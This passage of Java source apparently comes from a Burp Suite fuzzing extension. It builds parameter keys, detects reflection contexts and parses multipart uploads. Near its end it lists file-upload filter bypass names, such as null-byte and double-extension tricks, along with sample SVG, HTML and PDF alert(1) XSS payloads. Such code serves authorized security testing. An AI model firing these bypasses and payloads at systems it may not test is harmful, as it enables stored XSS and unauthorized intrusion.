        Set<String> uniq = new HashSet<>();
        if (url != null) {
            String query = url.getQuery();
            if (query != null && !query.trim().isEmpty()) {
                for (String n : extractQueryParamNames(query)) {
                    if (n == null) {
                        continue;
                    }
                    String nn = n.trim();
                    if (!nn.isEmpty()) {
                        uniq.add("U:" + nn);
                    }
                }
            }
        }
        if (requestInfo != null && "POST".equalsIgnoreCase(method)) {
            String body = extractRequestBodyAsString(requestBytes, requestInfo.getBodyOffset());
            if (isFormUrlEncoded(requestInfo.getHeaders()) || (body.contains("=") && !body.trim().startsWith("{"))) {
                LinkedHashMap<String, String> bodyParams = extractUrlEncodedParamsOrdered(body);
                for (String n : bodyParams.keySet()) {
                    if (n != null && !n.trim().isEmpty()) {
                        uniq.add("B:" + n.trim());
                    }
                }
            } else if (body.trim().startsWith("{")) {
                for (String n : extractJsonParamNames(body)) {
                    if (n != null && !n.trim().isEmpty()) {
                        uniq.add(IParameter.PARAM_JSON + ":" + n.trim());
                    }
                }
            }
        }

        if (requestInfo != null) {
            for (IParameter p : requestInfo.getParameters()) {
                if (p == null) {
                    continue;
                }
                int type = p.getType();
                if (type != IParameter.PARAM_URL && type != IParameter.PARAM_BODY && type != IParameter.PARAM_JSON) {
                    continue;
                }
                String name = p.getName();
                if (name == null) {
                    continue;
                }
                String n = name.trim();
                if (n.isEmpty()) {
                    continue;
                }
                uniq.add(type + ":" + n);
            }
        }
        if (requestInfo != null && requestBytes != null && isFormUrlEncoded(requestInfo.getHeaders())) {
            String body = extractRequestBodyAsString(requestBytes, requestInfo.getBodyOffset());
            for (String n : extractQueryParamNames(body)) {
                if (n == null) {
                    continue;
                }
                String nn = n.trim();
                if (!nn.isEmpty()) {
                    uniq.add("B:" + nn);
                }
            }
        }
        List<String> parts = new ArrayList<>(uniq);
        Collections.sort(parts);
        int hash = parts.toString().hashCode();
        return serviceKey + "|" + method + "|" + path + "|" + Integer.toHexString(hash);
    }

    private static String buildStopKey(IHttpService service, String method, URL url) {
        String serviceKey = service == null ? "" : (service.getProtocol() + "://" + service.getHost() + ":" + service.getPort());
        String path = url == null ? "" : url.getPath();
        return serviceKey + "|" + method + "|" + path + "|STOP_ALL";
    }

    private static String buildTargetKey(IHttpService service, String method, URL url, String mode, String targetName) {
        String serviceKey = service == null ? "" : (service.getProtocol() + "://" + service.getHost() + ":" + service.getPort());
        String path = url == null ? "" : url.getPath();
        return serviceKey + "|" + method + "|" + path + "|" + mode + "|" + targetName;
    }

    @Override
    public void extensionUnloaded() {
        ExecutorService exec = passiveFuzzExecutor;
        passiveFuzzExecutor = null;
        if (exec != null) {
            exec.shutdownNow();
        }
    }

    private static final class LruSet {
        private final int maxSize;
        private final LinkedHashMap<String, Boolean> map;

        private LruSet(int maxSize) {
            this.maxSize = Math.max(256, maxSize);
            this.map = new LinkedHashMap<String, Boolean>(this.maxSize, 0.75f, true) {
                @Override
                protected boolean removeEldestEntry(Map.Entry<String, Boolean> eldest) {
                    return size() > LruSet.this.maxSize;
                }
            };
        }

        private synchronized boolean add(String key) {
            return map.put(key, Boolean.TRUE) == null;
        }
    }

    private static ReflectionContext detectReflectionContext(String body, int reflectedIndex) {
        String lower = body.toLowerCase(Locale.ROOT);
        int lastScriptOpen = lower.lastIndexOf("<script", reflectedIndex);
        int lastScriptClose = lower.lastIndexOf("</script", reflectedIndex);
        boolean inScript = lastScriptOpen >= 0 && lastScriptOpen > lastScriptClose;

        boolean inAttribute = false;
        char quote = 0;

        int tagStart = lower.lastIndexOf('<', reflectedIndex);
        int tagEnd = lower.indexOf('>', reflectedIndex);
        if (tagStart >= 0 && tagEnd > tagStart) {
            String tag = body.substring(tagStart, tagEnd);
            int relativeIndex = reflectedIndex - tagStart;
            int eq = tag.lastIndexOf('=', relativeIndex);
            if (eq >= 0) {
                int lastDouble = tag.lastIndexOf('"', relativeIndex);
                int lastSingle = tag.lastIndexOf('\'', relativeIndex);
                if (lastDouble > eq && tag.indexOf('"', relativeIndex) > relativeIndex) {
                    inAttribute = true;
                    quote = '"';
                } else if (lastSingle > eq && tag.indexOf('\'', relativeIndex) > relativeIndex) {
                    inAttribute = true;
                    quote = '\'';
                } else if (relativeIndex > eq) {
                    inAttribute = true;
                    quote = 0;
                }
            }
        }

        return new ReflectionContext(inScript, inAttribute, quote);
    }

    private static final class ReflectionContext {
        private final boolean inScript;
        private final boolean inAttribute;
        private final char quote;

        private ReflectionContext(boolean inScript, boolean inAttribute, char quote) {
            this.inScript = inScript;
            this.inAttribute = inAttribute;
            this.quote = quote;
        }
    }

    private MultipartInfo parseMultipartRequest(byte[] requestBytes, IRequestInfo requestInfo) {
        String contentType = null;
        for (String header : requestInfo.getHeaders()) {
            int idx = header.indexOf(':');
            if (idx <= 0) {
                continue;
            }
            String name = header.substring(0, idx).trim().toLowerCase(Locale.ROOT);
            if ("content-type".equals(name)) {
                contentType = header.substring(idx + 1).trim();
                break;
            }
        }
        if (contentType == null) {
            return null;
        }

        String lower = contentType.toLowerCase(Locale.ROOT);
        if (!lower.contains("multipart/form-data") || !lower.contains("boundary=")) {
            return null;
        }

        String boundary = extractBoundary(contentType);
        if (boundary == null || boundary.trim().isEmpty()) {
            return null;
        }

        int bodyOffset = requestInfo.getBodyOffset();
        String requestText = helpers.bytesToString(requestBytes);
        if (bodyOffset >= requestText.length()) {
            return null;
        }
        String body = requestText.substring(bodyOffset);

        String delimiter = "--" + boundary;
        String[] parts = body.split(java.util.regex.Pattern.quote(delimiter));
        List<MultipartFilePart> fileParts = new ArrayList<>();

        for (String part : parts) {
            if (part.trim().isEmpty()) {
                continue;
            }
            int headerEnd = part.indexOf("\r\n\r\n");
            if (headerEnd < 0) {
                headerEnd = part.indexOf("\n\n");
            }
            if (headerEnd < 0) {
                continue;
            }
            String partHeaders = part.substring(0, headerEnd);

            String disposition = findHeaderValue(partHeaders, "content-disposition");
            if (disposition == null || !disposition.toLowerCase(Locale.ROOT).contains("form-data")) {
                continue;
            }

            String filename = extractQuotedToken(disposition, "filename");
            if (filename == null) {
                continue;
            }
            String fieldName = extractQuotedToken(disposition, "name");
            if (fieldName == null) {
                fieldName = "";
            }

            String partContentType = findHeaderValue(partHeaders, "content-type");
            fileParts.add(new MultipartFilePart(fieldName, filename, partContentType));
        }

        if (fileParts.isEmpty()) {
            return null;
        }
        return new MultipartInfo(boundary, fileParts);
    }

    private static String extractBoundary(String contentTypeHeaderValue) {
        String[] pieces = contentTypeHeaderValue.split(";");
        for (String p : pieces) {
            String trimmed = p.trim();
            if (trimmed.toLowerCase(Locale.ROOT).startsWith("boundary=")) {
                String b = trimmed.substring("boundary=".length());
                if (b.startsWith("\"") && b.endsWith("\"") && b.length() >= 2) {
                    b = b.substring(1, b.length() - 1);
                }
                return b;
            }
        }
        return null;
    }

    private static String findHeaderValue(String headersBlock, String headerNameLower) {
        String[] lines = headersBlock.split("\r\n|\n");
        for (String line : lines) {
            int idx = line.indexOf(':');
            if (idx <= 0) {
                continue;
            }
            String name = line.substring(0, idx).trim().toLowerCase(Locale.ROOT);
            if (name.equals(headerNameLower)) {
                return line.substring(idx + 1).trim();
            }
        }
        return null;
    }

    private static String extractQuotedToken(String headerValue, String key) {
        String needle = key + "=\"";
        int start = headerValue.indexOf(needle);
        if (start < 0) {
            needle = key + "=";
            start = headerValue.indexOf(needle);
            if (start < 0) {
                return null;
            }
            int s = start + needle.length();
            int end = headerValue.indexOf(';', s);
            if (end < 0) {
                end = headerValue.length();
            }
            return headerValue.substring(s, end).trim();
        }
        int s = start + needle.length();
        int e = headerValue.indexOf('"', s);
        if (e < 0) {
            return null;
        }
        return headerValue.substring(s, e);
    }

    private static List<String> uploadFilenameBypassCandidates() {
        return Arrays.asList(
                "test.svg",
                "test.html",
                "test.pdf",
                "test.xhtml",
                "test.svg.jpg",
                "test.jpg.svg",
                "test.svg;.jpg",
                "test.svg%00.jpg",
                "test.svg%20.jpg",
                "test.svg..jpg",
                "test.svg.",
                "test.SvG"
        );
    }

    private static String sampleSvgPayload() {
        return "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>";
    }

    private static String sampleHtmlPayload() {
        return "<!doctype html><html><body><script>alert(1)</script></body></html>";
    }

    private static String samplePdfPayload() {
        return ""
                + "%PDF-1.5\n"
                + "1 0 obj\n"
                + "<< /Type /Catalog /OpenAction 2 0 R >>\n"
                + "endobj\n"
                + "2 0 obj\n"
                + "<< /S /JavaScript /JS (app.alert(1)) >>\n"
                + "endobj\n"
                + "trailer\n"
                + "<< /Root 1 0 R >>\n"
                + "%%EOF\n";
    }

    private static final class MultipartInfo {
        private final String boundary;
        private final List<MultipartFilePart> fileParts;

        private MultipartInfo(String boundary, List<MultipartFilePart> fileParts) {
            this.boundary = boundary;
            this.fileParts = fileParts;
        }

        private String summaryKey() {
            if (fileParts.isEmpty()) {
                return boundary;
            }
            StringBuilder sb = new StringBuilder();
            for (MultipartFilePart p : fileParts) {
                if (sb.length() > 0) {
                    sb.append(",");
                }
                sb.append(p.fieldName);
            }
            return sb.toString();
        }
    }

    private static final class MultipartFilePart {
        private final String fieldName;
        private final String filename;
        private final String contentType;

        private MultipartFilePart(String fieldName, String filename, String contentType) {
            this.fieldName = fieldName;
            this.filename = filename;
            this.contentType = contentType;
        }
    }
}
